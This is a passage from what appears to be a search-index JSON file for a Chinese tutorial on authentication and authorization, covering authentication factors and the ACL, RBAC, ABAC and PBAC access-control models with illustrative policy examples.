</ul>"},{"location":"auth/#_16","title":"\ud83d\udcd6 \u6269\u5c55\u9605\u8bfb","text":""},{"location":"auth/#_17","title":"\u5b98\u65b9\u6587\u6863","text":"<ul> <li>Spring Security Reference</li> <li>Spring Authorization Server</li> <li>RFC 6749 - OAuth 2.0</li> <li>RFC 7519 - JWT</li> <li>OpenID Connect</li> </ul>"},{"location":"auth/#_18","title":"\u5b89\u5168\u8d44\u6e90","text":"<ul> <li>OWASP Top 10</li> <li>OWASP Cheat Sheet Series</li> <li>JWT Best Practices</li> </ul>"},{"location":"auth/#_19","title":"\u5f00\u6e90\u9879\u76ee\u53c2\u8003","text":"<ul> <li>Spring Security Samples</li> <li>Keycloak</li> <li>JHipster - \u96c6\u6210\u4e86\u5b8c\u6574\u7684\u8ba4\u8bc1\u6388\u6743</li> </ul>"},{"location":"auth/#_20","title":"\ud83e\udd1d \u8d21\u732e","text":"<p>\u672c\u6587\u6863\u6301\u7eed\u66f4\u65b0\u4e2d\uff0c\u6b22\u8fce\u63d0\u51fa\u6539\u8fdb\u5efa\u8bae\uff01</p>"},{"location":"auth/#_21","title":"\ud83d\udcdd \u66f4\u65b0\u65e5\u5fd7","text":"<ul> <li>2025-10 - \u521d\u59cb\u7248\u672c\u53d1\u5e03</li> <li>\u5b8c\u6574\u76848\u7ae0\u8282\u5185\u5bb9</li> <li>\u6db5\u76d6\u4ece\u57fa\u7840\u5230\u9ad8\u7ea7\u7684\u5b8c\u6574\u77e5\u8bc6\u4f53\u7cfb</li> <li>\u63d0\u4f9b\u5b9e\u6218\u4ee3\u7801\u793a\u4f8b</li> </ul>"},{"location":"auth/#_22","title":"\ud83d\udcc4 \u8bb8\u53ef","text":"<p>\u672c\u6587\u6863\u91c7\u7528 CC BY-NC-SA 4.0 \u8bb8\u53ef\u534f\u8bae\u3002</p> <p>\u5f00\u59cb\u5b66\u4e60\uff1a 01 - \u8ba4\u8bc1\u6388\u6743\u57fa\u7840 \u2192</p> <p>\u795d\u4f60\u5b66\u4e60\u987a\u5229\uff01 \ud83c\udf89</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/","title":"\u8ba4\u8bc1\u6388\u6743\u57fa\u7840\u77e5\u8bc6","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_2","title":"\u76ee\u5f55","text":"<ul> <li>\u6838\u5fc3\u6982\u5ff5</li> <li>\u8ba4\u8bc1\u4e0e\u6388\u6743\u7684\u533a\u522b</li> <li>\u4f1a\u8bdd\u7ba1\u7406</li> <li>\u5bc6\u7801\u5b66\u57fa\u7840</li> <li>\u5e38\u89c1\u653b\u51fb\u65b9\u5f0f\u4e0e\u9632\u62a4</li> <li>\u5b89\u5168\u6700\u4f73\u5b9e\u8df5</li> </ul>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_3","title":"\u6838\u5fc3\u6982\u5ff5","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#authentication","title":"\u4ec0\u4e48\u662f\u8ba4\u8bc1\uff08Authentication\uff09\uff1f","text":"<p>**\u8ba4\u8bc1**\u662f\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u7684\u8fc7\u7a0b\uff0c\u56de\u7b54\"\u4f60\u662f\u8c01\uff1f\"\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u6838\u5fc3\u8981\u7d20\uff1a - \u8eab\u4efd\u6807\u8bc6\uff08Identity\uff09\uff1a\u552f\u4e00\u8bc6\u522b\u7528\u6237\u7684\u4fe1\u606f\uff08\u5982\u7528\u6237\u540d\u3001\u90ae\u7bb1\u3001\u624b\u673a\u53f7\uff09 - \u51ed\u8bc1\uff08Credentials\uff09\uff1a\u8bc1\u660e\u8eab\u4efd\u7684\u4fe1\u606f\uff08\u5982\u5bc6\u7801\u3001\u6307\u7eb9\u3001\u8bc1\u4e66\uff09 - \u8ba4\u8bc1\u56e0\u5b50\uff08Authentication Factors\uff09\uff1a   - \u77e5\u8bc6\u56e0\u5b50\uff1a\u4f60\u77e5\u9053\u7684\uff08\u5bc6\u7801\u3001PIN\u7801\u3001\u5b89\u5168\u95ee\u9898\u7b54\u6848\uff09   - \u6301\u6709\u56e0\u5b50\uff1a\u4f60\u62e5\u6709\u7684\uff08\u624b\u673a\u3001\u4ee4\u724c\u3001\u667a\u80fd\u5361\uff09   - \u56fa\u6709\u56e0\u5b50\uff1a\u4f60\u662f\u7684\uff08\u6307\u7eb9\u3001\u4eba\u8138\u3001\u8679\u819c\uff09</p> <p>\u8ba4\u8bc1\u5f3a\u5ea6\uff1a - \u5355\u56e0\u7d20\u8ba4\u8bc1\uff08SFA\uff09\uff1a\u53ea\u4f7f\u7528\u4e00\u79cd\u56e0\u5b50\uff08\u5982\u4ec5\u5bc6\u7801\uff09 - \u53cc\u56e0\u7d20\u8ba4\u8bc1\uff082FA\uff09\uff1a\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u56e0\u5b50 - \u591a\u56e0\u7d20\u8ba4\u8bc1\uff08MFA\uff09\uff1a\u4f7f\u7528\u4e24\u79cd\u6216\u4ee5\u4e0a\u56e0\u5b50</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#authorization","title":"\u4ec0\u4e48\u662f\u6388\u6743\uff08Authorization\uff09\uff1f","text":"<p>**\u6388\u6743**\u662f\u786e\u5b9a\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u54ea\u4e9b\u8d44\u6e90\u7684\u8fc7\u7a0b\uff0c\u56de\u7b54\"\u4f60\u80fd\u505a\u4ec0\u4e48\uff1f\"\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u6838\u5fc3\u8981\u7d20\uff1a - \u4e3b\u4f53\uff08Subject\uff09\uff1a\u8bf7\u6c42\u8bbf\u95ee\u7684\u7528\u6237\u6216\u670d\u52a1 - \u8d44\u6e90\uff08Resource\uff09\uff1a\u88ab\u4fdd\u62a4\u7684\u5bf9\u8c61\uff08\u6587\u4ef6\u3001API\u3001\u6570\u636e\uff09 - \u6743\u9650\uff08Permission\uff09\uff1a\u5141\u8bb8\u7684\u64cd\u4f5c\uff08\u8bfb\u3001\u5199\u3001\u5220\u9664\u3001\u6267\u884c\uff09 - \u7b56\u7565\uff08Policy\uff09\uff1a\u5b9a\u4e49\u8bbf\u95ee\u89c4\u5219\u7684\u96c6\u5408</p> <p>\u6388\u6743\u6a21\u578b\uff1a</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#1-acl-access-control-list","title":"1. \u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08ACL - Access Control List\uff09","text":"<p>\u7406\u8bba\u57fa\u7840\uff1a</p> <p>ACL\u662f\u6700\u76f4\u89c2\u7684\u8bbf\u95ee\u63a7\u5236\u6a21\u578b\uff0c\u76f4\u63a5\u5c06\u8bbf\u95ee\u6743\u9650\u4e0e\u8d44\u6e90\u7ed1\u5b9a\u3002\u6bcf\u4e2a\u8d44\u6e90\u7ef4\u62a4\u4e00\u4e2a\u5217\u8868\uff0c\u660e\u786e\u6307\u5b9a\u54ea\u4e9b\u4e3b\u4f53\uff08\u7528\u6237\u3001\u7ec4\uff09\u5bf9\u8be5\u8d44\u6e90\u62e5\u6709\u54ea\u4e9b\u6743\u9650\u3002</p> <p>\u5de5\u4f5c\u539f\u7406\uff1a <pre><code>\u8d44\u6e90 \u2192 ACL\u6761\u76ee\u5217\u8868\n\u6bcf\u4e2aACL\u6761\u76ee\u5305\u542b\uff1a\n  - \u4e3b\u4f53\u6807\u8bc6\uff08\u7528\u6237/\u7ec4\uff09\n  - \u6743\u9650\u7c7b\u578b\uff08\u8bfb/\u5199/\u6267\u884c/\u5220\u9664\u7b49\uff09\n  - \u5141\u8bb8/\u62d2\u7edd\u6807\u5fd7\n</code></pre></p> <p>\u6570\u636e\u7ed3\u6784\u793a\u4f8b\uff1a <pre><code>// \u6587\u4ef6\u7cfb\u7edfACL\u793a\u4f8b\n\u6587\u4ef6: /document/report.pdf\nACL:\n  - { \u4e3b\u4f53: \"user:\u5f20\u4e09\",   \u6743\u9650: [\"READ\", \"WRITE\"],        \u7c7b\u578b: ALLOW }\n  - { \u4e3b\u4f53: \"user:\u674e\u56db\",   \u6743\u9650: [\"READ\"],                 \u7c7b\u578b: ALLOW }\n  - { \u4e3b\u4f53: \"group:\u8d22\u52a1\", \u6743\u9650: [\"READ\", \"WRITE\", \"DELETE\"], \u7c7b\u578b: ALLOW }\n  - { \u4e3b\u4f53: \"user:\u738b\u4e94\",   \u6743\u9650: [\"READ\", \"WRITE\"],        \u7c7b\u578b: DENY  }\n\n// API\u8d44\u6e90ACL\u793a\u4f8b\n\u8d44\u6e90: /api/orders/{orderId}\nACL:\n  - { \u4e3b\u4f53: \"user:admin\",     \u6743\u9650: [\"GET\", \"POST\", \"PUT\", \"DELETE\"], \u7c7b\u578b: ALLOW }\n  - { \u4e3b\u4f53: \"user:customer\",  \u6743\u9650: [\"GET\"],                          \u7c7b\u578b: ALLOW }\n  - { \u4e3b\u4f53: \"role:\u8ba2\u5355\u7ba1\u7406\u5458\", \u6743\u9650: [\"GET\", \"PUT\"],                   \u7c7b\u578b: ALLOW }\n</code></pre></p> <p>\u5b9e\u9645\u573a\u666f\u793a\u4f8b\uff1a</p> <ol> <li> <p>Linux\u6587\u4ef6\u7cfb\u7edf\u6743\u9650 <pre><code>-rw-r--r--  1 zhang staff  4096 Oct 26 10:30 file.txt\n\u6240\u6709\u8005(zhang): \u8bfb+\u5199\n\u7ec4(staff):     \u8bfb\n\u5176\u4ed6:          \u8bfb\n</code></pre></p> </li> <li> <p>AWS S3\u5b58\u50a8\u6876\u7b56\u7565 <pre><code>{\n  \"Resource\": \"arn:aws:s3:::mybucket/data/*\",\n  \"Principal\": {\"AWS\": \"arn:aws:iam::123456789:user/zhang\"},\n  \"Action\": [\"s3:GetObject\", \"s3:PutObject\"],\n  \"Effect\": \"Allow\"\n}\n</code></pre></p> </li> </ol> <p>\u4f18\u70b9\uff1a - \u2705 \u7b80\u5355\u76f4\u89c2\uff0c\u6613\u4e8e\u7406\u89e3 - \u2705 \u7ec6\u7c92\u5ea6\u63a7\u5236\uff0c\u7cbe\u786e\u5230\u6bcf\u4e2a\u8d44\u6e90 - \u2705 \u5b9e\u73b0\u7b80\u5355\uff0c\u6027\u80fd\u9ad8 - \u2705 \u9002\u5408\u8d44\u6e90\u6570\u91cf\u5c11\u7684\u573a\u666f</p> <p>\u7f3a\u70b9\uff1a - \u274c \u8d44\u6e90\u6570\u91cf\u591a\u65f6\u7ba1\u7406\u590d\u6742 - \u274c \u6743\u9650\u53d8\u66f4\u9700\u8981\u9010\u4e2a\u4fee\u6539\u8d44\u6e90 - \u274c \u96be\u4ee5\u5b9e\u73b0\u7edf\u4e00\u7684\u6743\u9650\u7b56\u7565 - \u274c \u6743\u9650\u5206\u6563\uff0c\u7f3a\u4e4f\u5168\u5c40\u89c6\u56fe - \u274c \u7528\u6237\u79bb\u804c\u9700\u6e05\u7406\u6240\u6709\u76f8\u5173ACL</p> <p>\u9002\u7528\u573a\u666f\uff1a - \u6587\u4ef6\u7cfb\u7edf\u3001\u5bf9\u8c61\u5b58\u50a8 - \u8d44\u6e90\u6570\u91cf\u6709\u9650\u7684\u5c0f\u578b\u7cfb\u7edf - \u9700\u8981\u8d44\u6e90\u7ea7\u7cbe\u786e\u63a7\u5236\u7684\u573a\u666f - \u4e91\u5e73\u53f0\u8d44\u6e90\u6743\u9650\u7ba1\u7406</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#2-rbac-role-based-access-control","title":"2. \u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\uff08RBAC - Role-Based Access Control\uff09","text":"<p>\u7406\u8bba\u57fa\u7840\uff1a</p> <p>RBAC\u662f\u76ee\u524d\u6700\u5e7f\u6cdb\u4f7f\u7528\u7684\u6388\u6743\u6a21\u578b\uff0c\u901a\u8fc7\u5f15\u5165\"\u89d2\u8272\"\u4f5c\u4e3a\u7528\u6237\u548c\u6743\u9650\u4e4b\u95f4\u7684\u4e2d\u4ecb\u5c42\uff0c\u5b9e\u73b0\u6743\u9650\u7684\u6279\u91cf\u7ba1\u7406\u548c\u590d\u7528\u3002</p> <p>\u4e09\u5c42\u6a21\u578b\uff1a <pre><code>\u7528\u6237\uff08User\uff09 \u2192 \u89d2\u8272\uff08Role\uff09 \u2192 \u6743\u9650\uff08Permission\uff09 \u2192 \u8d44\u6e90\uff08Resource\uff09\n\n\u6838\u5fc3\u5173\u7cfb\uff1a\n- \u7528\u6237\u5206\u914d\u89d2\u8272\uff1a\u4e00\u4e2a\u7528\u6237\u53ef\u4ee5\u6709\u591a\u4e2a\u89d2\u8272\n- \u89d2\u8272\u62e5\u6709\u6743\u9650\uff1a\u4e00\u4e2a\u89d2\u8272\u5305\u542b\u591a\u4e2a\u6743\u9650\n- \u6743\u9650\u4f5c\u7528\u4e8e\u8d44\u6e90\uff1a\u4e00\u4e2a\u6743\u9650\u5b9a\u4e49\u5bf9\u7279\u5b9a\u8d44\u6e90\u7684\u64cd\u4f5c\n</code></pre></p> <p>\u6570\u636e\u7ed3\u6784\u793a\u4f8b\uff1a <pre><code>// \u7528\u6237\u8868\nUser:\n  - id: 1001\n  - username: \"\u5f20\u4e09\"\n  - roles: [2, 3]  // \u5173\u8054\u89d2\u8272ID\n\n// \u89d2\u8272\u8868\nRole:\n  - id: 2\n  - name: \"\u7f16\u8f91\u8005\"\n  - description: \"\u53ef\u4ee5\u521b\u5efa\u548c\u7f16\u8f91\u6587\u7ae0\"\n  - permissions: [101, 102, 103]\n  - parent_role: null  // \u89d2\u8272\u7ee7\u627f\n\n// \u6743\u9650\u8868\nPermission:\n  - id: 101\n  - name: \"article:create\"\n  - description: \"\u521b\u5efa\u6587\u7ae0\"\n  - resource: \"article\"\n  - action: \"create\"\n\n  - id: 102\n  - name: \"article:edit\"\n  - resource: \"article\"\n  - action: \"edit\"\n\n  - id: 103\n  - name: \"article:publish\"\n  - resource: \"article\"\n  - action: \"publish\"\n\n// \u5173\u7cfb\u6620\u5c04\n\u7528\u6237\u5f20\u4e09\u7684\u6743\u9650\u8def\u5f84\uff1a\n\u5f20\u4e09 \u2192 [\u7f16\u8f91\u8005\u89d2\u8272] \u2192 [article:create, article:edit, article:publish]\n</code></pre></p> <p>RBAC\u6a21\u578b\u5c42\u6b21\uff1a</p> <ol> <li>RBAC0\uff08\u6838\u5fc3RBAC\uff09</li> <li>\u57fa\u7840\u6a21\u578b\uff1a\u7528\u6237-\u89d2\u8272-\u6743\u9650</li> <li> <p>\u652f\u6301\u591a\u5bf9\u591a\u5173\u7cfb</p> </li> <li> <p>RBAC1\uff08\u5206\u5c42RBAC\uff09</p> </li> <li> <p>\u5f15\u5165\u89d2\u8272\u7ee7\u627f    <pre><code>\u9ad8\u7ea7\u7f16\u8f91 \u7ee7\u627f\u81ea \u7f16\u8f91\u8005\n\u9ad8\u7ea7\u7f16\u8f91\u62e5\u6709\uff1a\u7f16\u8f91\u8005\u7684\u6240\u6709\u6743\u9650 + \u989d\u5916\u6743\u9650\n</code></pre></p> </li> <li> <p>RBAC2\uff08\u7ea6\u675fRBAC\uff09</p> </li> <li>\u804c\u8d23\u5206\u79bb\u7ea6\u675f\uff08SoD\uff09</li> <li> <p>\u4e92\u65a5\u89d2\u8272\uff1a\u4e00\u4e2a\u7528\u6237\u4e0d\u80fd\u540c\u65f6\u62e5\u6709\u51b2\u7a81\u89d2\u8272    <pre><code>\u4f8b\u5982\uff1a\u51fa\u7eb3\u5458 \u548c \u5ba1\u8ba1\u5458 \u4e92\u65a5\n</code></pre></p> </li> <li> <p>RBAC3\uff08\u7edf\u4e00RBAC\uff09</p> </li> <li>RBAC1 + RBAC2\u7684\u7ec4\u5408</li> </ol> <p>\u5b9e\u9645\u573a\u666f\u793a\u4f8b\uff1a</p> <pre><code>\u4f01\u4e1a\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff1a\n\n\u89d2\u8272\u5b9a\u4e49\uff1a\n- \u666e\u901a\u7528\u6237\uff1a\u6d4f\u89c8\u6587\u7ae0\u3001\u8bc4\u8bba\n- \u4f5c\u8005\uff1a\u666e\u901a\u7528\u6237\u6743\u9650 + \u521b\u5efa\u6587\u7ae0\u3001\u7f16\u8f91\u81ea\u5df1\u7684\u6587\u7ae0\n- \u7f16\u8f91\uff1a\u4f5c\u8005\u6743\u9650 + \u7f16\u8f91\u6240\u6709\u6587\u7ae0\u3001\u5ba1\u6838\u6587\u7ae0\n- \u7ba1\u7406\u5458\uff1a\u7f16\u8f91\u6743\u9650 + \u5220\u9664\u6587\u7ae0\u3001\u7528\u6237\u7ba1\u7406\u3001\u7cfb\u7edf\u914d\u7f6e\n\n\u6743\u9650\u77e9\u9635\uff1a\n           | \u6d4f\u89c8 | \u521b\u5efa | \u7f16\u8f91\u81ea\u5df1 | \u7f16\u8f91\u6240\u6709 | \u5220\u9664 | \u5ba1\u6838 | \u7528\u6237\u7ba1\u7406 |\n-----------|------|------|----------|----------|------|------|----------|\n\u666e\u901a\u7528\u6237   |  \u2713   |      |          |          |      |      |          |\n\u4f5c\u8005       |  \u2713   |  \u2713   |    \u2713     |          |      |      |          |\n\u7f16\u8f91       |  \u2713   |  \u2713   |    \u2713     |    \u2713     |      |  \u2713   |          |\n\u7ba1\u7406\u5458     |  \u2713   |  \u2713   |    \u2713     |    \u2713     |  \u2713   |  \u2713   |    \u2713     |\n</code></pre> <p>\u4f18\u70b9\uff1a - \u2705 \u6743\u9650\u7ba1\u7406\u96c6\u4e2d\u5316\uff0c\u6613\u4e8e\u7ef4\u62a4 - \u2705 \u7b26\u5408\u7ec4\u7ec7\u7ed3\u6784\uff0c\u89d2\u8272\u5bf9\u5e94\u5c97\u4f4d - \u2705 \u6279\u91cf\u6388\u6743\uff0c\u6548\u7387\u9ad8 - \u2705 \u6613\u4e8e\u5ba1\u8ba1\u548c\u5408\u89c4 - \u2705 \u964d\u4f4e\u7ba1\u7406\u6210\u672c</p> <p>\u7f3a\u70b9\uff1a - \u274c \u89d2\u8272\u7206\u70b8\u95ee\u9898\uff08\u7ec4\u5408\u8fc7\u591a\uff09 - \u274c \u7075\u6d3b\u6027\u76f8\u5bf9\u8f83\u4f4e - \u274c \u96be\u4ee5\u5904\u7406\u52a8\u6001\u6743\u9650\u9700\u6c42 - \u274c \u8de8\u7ec4\u7ec7\u534f\u4f5c\u573a\u666f\u652f\u6301\u4e0d\u8db3 - \u274c \u9700\u8981\u63d0\u524d\u89c4\u5212\u89d2\u8272\u4f53\u7cfb</p> <p>\u9002\u7528\u573a\u666f\uff1a - \u4f01\u4e1a\u5185\u90e8\u7ba1\u7406\u7cfb\u7edf - \u6743\u9650\u7ed3\u6784\u76f8\u5bf9\u7a33\u5b9a\u7684\u5e94\u7528 - \u7528\u6237\u89d2\u8272\u6e05\u6670\u7684\u7ec4\u7ec7 - \u5927\u591a\u6570Web\u5e94\u7528\u548cSaaS\u5e73\u53f0</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#3-abac-attribute-based-access-control","title":"3. \u57fa\u4e8e\u5c5e\u6027\u7684\u8bbf\u95ee\u63a7\u5236\uff08ABAC - Attribute-Based Access Control\uff09","text":"<p>\u7406\u8bba\u57fa\u7840\uff1a</p> <p>ABAC\u901a\u8fc7\u8bc4\u4f30\u4e3b\u4f53\u3001\u8d44\u6e90\u3001\u73af\u5883\u7684\u591a\u7ef4\u5c5e\u6027\u6765\u52a8\u6001\u51b3\u5b9a\u8bbf\u95ee\u6743\u9650\uff0c\u662f\u6700\u7075\u6d3b\u7684\u6388\u6743\u6a21\u578b\u3002</p> <p>\u6838\u5fc3\u8981\u7d20\uff1a <pre><code>\u8bbf\u95ee\u51b3\u7b56 = f(\u4e3b\u4f53\u5c5e\u6027, \u8d44\u6e90\u5c5e\u6027, \u73af\u5883\u5c5e\u6027, \u64cd\u4f5c)\n\n1. \u4e3b\u4f53\u5c5e\u6027\uff08Subject Attributes\uff09\uff1a\n   - \u7528\u6237\u8eab\u4efd\uff1a\u7528\u6237ID\u3001\u7528\u6237\u540d\n   - \u7ec4\u7ec7\u5c5e\u6027\uff1a\u90e8\u95e8\u3001\u804c\u7ea7\u3001\u5de5\u4f5c\u5730\u70b9\n   - \u5b89\u5168\u5c5e\u6027\uff1a\u5b89\u5168\u7ea7\u522b\u3001\u8ba4\u8bc1\u65b9\u5f0f\n\n2. \u8d44\u6e90\u5c5e\u6027\uff08Resource Attributes\uff09\uff1a\n   - \u8d44\u6e90\u7c7b\u578b\uff1a\u6587\u6863\u3001\u6570\u636e\u3001API\n   - \u8d44\u6e90\u5143\u6570\u636e\uff1a\u521b\u5efa\u8005\u3001\u6240\u5c5e\u90e8\u95e8\u3001\u5206\u7c7b\n   - \u654f\u611f\u7ea7\u522b\uff1a\u516c\u5f00\u3001\u5185\u90e8\u3001\u673a\u5bc6\n\n3. \u73af\u5883\u5c5e\u6027\uff08Environment Attributes\uff09\uff1a\n   - \u65f6\u95f4\uff1a\u65e5\u671f\u3001\u65f6\u95f4\u6bb5\u3001\u5de5\u4f5c\u65e5/\u975e\u5de5\u4f5c\u65e5\n   - \u4f4d\u7f6e\uff1aIP\u5730\u5740\u3001\u5730\u7406\u4f4d\u7f6e\u3001\u7f51\u7edc\u533a\u57df\n   - \u4e0a\u4e0b\u6587\uff1a\u8bbe\u5907\u7c7b\u578b\u3001\u5b89\u5168\u72b6\u6001\n\n4. \u64cd\u4f5c\uff08Action\uff09\uff1a\n   - \u8bfb\u53d6\u3001\u521b\u5efa\u3001\u4fee\u6539\u3001\u5220\u9664\n</code></pre></p> <p>\u7b56\u7565\u89c4\u5219\u7ed3\u6784\uff1a <pre><code>\u7b56\u7565\u89c4\u5219\u683c\u5f0f\uff1a\nIF (\u6761\u4ef6\u8868\u8fbe\u5f0f) THEN (\u5141\u8bb8/\u62d2\u7edd)\n\n\u793a\u4f8b\u7b56\u7565\uff1a\nPolicy-001: \"\u90e8\u95e8\u6587\u6863\u8bbf\u95ee\"\n  IF (\n    subject.department == resource.department AND\n    subject.security_level &gt;= resource.security_level AND\n    action IN [\"read\", \"write\"]\n  ) THEN ALLOW\n\nPolicy-002: \"\u5de5\u4f5c\u65f6\u95f4\u9650\u5236\"\n  IF (\n    subject.role == \"contractor\" AND\n    environment.time NOT IN working_hours\n  ) THEN DENY\n\nPolicy-003: \"\u8de8\u90e8\u95e8\u534f\u4f5c\"\n  IF (\n    subject.user_id IN resource.collaborators AND\n    action == \"read\"\n  ) THEN ALLOW\n\nPolicy-004: \"\u5730\u7406\u4f4d\u7f6e\u9650\u5236\"\n  IF (\n    resource.classification == \"confidential\" AND\n    environment.location NOT IN [\"office\", \"vpn\"]\n  ) THEN DENY\n</code></pre></p> <p>\u51b3\u7b56\u6d41\u7a0b\uff1a <pre><code>1. \u6536\u96c6\u5c5e\u6027\n   \u251c\u2500 \u4ece\u8ba4\u8bc1\u4e0a\u4e0b\u6587\u83b7\u53d6\u4e3b\u4f53\u5c5e\u6027\n   \u251c\u2500 \u4ece\u8d44\u6e90\u5143\u6570\u636e\u83b7\u53d6\u8d44\u6e90\u5c5e\u6027\n   \u2514\u2500 \u4ece\u8bf7\u6c42\u4e0a\u4e0b\u6587\u83b7\u53d6\u73af\u5883\u5c5e\u6027\n\n2. \u7b56\u7565\u8bc4\u4f30\n   \u251c\u2500 \u52a0\u8f7d\u9002\u7528\u7684\u7b56\u7565\u89c4\u5219\n   \u251c\u2500 \u9010\u6761\u8bc4\u4f30\u89c4\u5219\u6761\u4ef6\n   \u2514\u2500 \u5408\u5e76\u8bc4\u4f30\u7ed3\u679c\uff08\u4f18\u5148\u7ea7\u3001\u51b2\u7a81\u89e3\u51b3\uff09\n\n3. \u8bbf\u95ee\u51b3\u7b56\n   \u2514\u2500 \u8fd4\u56de ALLOW / DENY / NOT_APPLICABLE\n</code></pre></p> <p>\u5b9e\u9645\u573a\u666f\u793a\u4f8b\uff1a</p> <pre><code>\u573a\u666f1\uff1a\u533b\u7597\u7cfb\u7edf\u60a3\u8005\u6570\u636e\u8bbf\u95ee\n\n\u89c4\u5219\uff1a\nIF (\n  subject.role == \"doctor\" AND\n  subject.department == patient.current_department AND\n  subject.hospital == patient.hospital AND\n  environment.network == \"internal\"\n) THEN ALLOW READ patient_record\n\n\u573a\u666f2\uff1a\u91d1\u878d\u7cfb\u7edf\u4ea4\u6613\u5ba1\u6279\n\n\u89c4\u5219\uff1a\nIF (\n  action == \"approve_transaction\" AND\n  transaction.amount &lt;= subject.approval_limit AND\n  subject.has_valid_mfa == true AND\n  environment.time IN business_hours\n) THEN ALLOW\n\n\u573a\u666f3\uff1a\u4e91\u5b58\u50a8\u6587\u4ef6\u5171\u4eab\n\n\u89c4\u5219\uff1a\nIF (\n  subject.user_id == resource.owner OR\n  subject.user_id IN resource.shared_with OR\n  (subject.organization == resource.organization AND \n   resource.visibility == \"organization\")\n) THEN ALLOW READ\n</code></pre> <p>\u4f18\u70b9\uff1a - \u2705 \u6781\u9ad8\u7684\u7075\u6d3b\u6027\u548c\u8868\u8fbe\u80fd\u529b - \u2705 \u652f\u6301\u52a8\u6001\u6743\u9650\u51b3\u7b56 - \u2705 \u9002\u5e94\u590d\u6742\u4e1a\u52a1\u89c4\u5219 - \u2705 \u7ec6\u7c92\u5ea6\u63a7\u5236 - \u2705 \u51cf\u5c11\u89d2\u8272\u7206\u70b8\u95ee\u9898 - \u2705 \u652f\u6301\u8de8\u7ec4\u7ec7\u534f\u4f5c</p> <p>\u7f3a\u70b9\uff1a - \u274c \u5b9e\u73b0\u590d\u6742\u5ea6\u9ad8 - \u274c \u6027\u80fd\u5f00\u9500\u8f83\u5927\uff08\u9700\u8bc4\u4f30\u591a\u4e2a\u5c5e\u6027\uff09 - \u274c \u7b56\u7565\u7f16\u5199\u548c\u7ef4\u62a4\u96be\u5ea6\u5927 - \u274c \u8c03\u8bd5\u548c\u5ba1\u8ba1\u56f0\u96be - \u274c \u9700\u8981\u5b8c\u5584\u7684\u5c5e\u6027\u7ba1\u7406\u7cfb\u7edf - \u274c \u5b66\u4e60\u66f2\u7ebf\u9661\u5ced</p> <p>\u9002\u7528\u573a\u666f\uff1a - \u590d\u6742\u7684\u4f01\u4e1a\u73af\u5883\uff08\u591a\u90e8\u95e8\u3001\u591a\u5c42\u7ea7\uff09 - \u9700\u8981\u52a8\u6001\u6743\u9650\u7684\u573a\u666f - \u8de8\u7ec4\u7ec7\u534f\u4f5c\u5e73\u53f0 - \u4e91\u670d\u52a1\u548c\u591a\u79df\u6237\u7cfb\u7edf - \u9700\u8981\u4e0a\u4e0b\u6587\u611f\u77e5\u7684\u5b89\u5168\u7cfb\u7edf - \u533b\u7597\u3001\u91d1\u878d\u7b49\u5f3a\u5408\u89c4\u884c\u4e1a</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#4-pbac-policy-based-access-control","title":"4. \u57fa\u4e8e\u7b56\u7565\u7684\u8bbf\u95ee\u63a7\u5236\uff08PBAC - Policy-Based Access Control\uff09","text":"<p>\u7406\u8bba\u57fa\u7840\uff1a</p> <p>PBAC\u901a\u8fc7\u4e13\u95e8\u7684\u7b56\u7565\u8bed\u8a00\u548c\u7b56\u7565\u5f15\u64ce\u6765\u5b9a\u4e49\u548c\u6267\u884c\u8bbf\u95ee\u63a7\u5236\u89c4\u5219\uff0c\u5f3a\u8c03\u7b56\u7565\u7684\u96c6\u4e2d\u7ba1\u7406\u548c\u52a8\u6001\u8bc4\u4f30\u3002</p> <p>\u6838\u5fc3\u7ec4\u4ef6\uff1a <pre><code>1. \u7b56\u7565\u5b9a\u4e49\u70b9\uff08PDP - Policy Decision Point\uff09\n   - \u8bc4\u4f30\u7b56\u7565\u5e76\u505a\u51fa\u8bbf\u95ee\u51b3\u7b56\n\n2. \u7b56\u7565\u6267\u884c\u70b9\uff08PEP - Policy Enforcement Point\uff09\n   - \u62e6\u622a\u8bbf\u95ee\u8bf7\u6c42\n   - \u8c03\u7528PDP\u83b7\u53d6\u51b3\u7b56\n   - \u6267\u884c\u51b3\u7b56\u7ed3\u679c\n\n3. \u7b56\u7565\u4fe1\u606f\u70b9\uff08PIP - Policy Information Point\uff09\n   - \u63d0\u4f9b\u51b3\u7b56\u6240\u9700\u7684\u5c5e\u6027\u4fe1\u606f\n\n4. \u7b56\u7565\u7ba1\u7406\u70b9\uff08PAP - Policy Administration Point\uff09\n   - \u7b56\u7565\u7684\u521b\u5efa\u3001\u4fee\u6539\u3001\u5220\u9664\n</code></pre></p> <p>\u7b56\u7565\u8bed\u8a00\uff08XACML\u6982\u5ff5\uff09\uff1a <pre><code>&lt;!-- XACML\u98ce\u683c\u7684\u7b56\u7565\u793a\u4f8b --&gt;\n&lt;Policy PolicyId=\"policy-01\" RuleCombiningAlg=\"permit-overrides\"&gt;\n\n  &lt;Target&gt;\n    &lt;Resources&gt;\n      &lt;Resource&gt;\n        &lt;ResourceMatch MatchId=\"string-equal\"&gt;\n          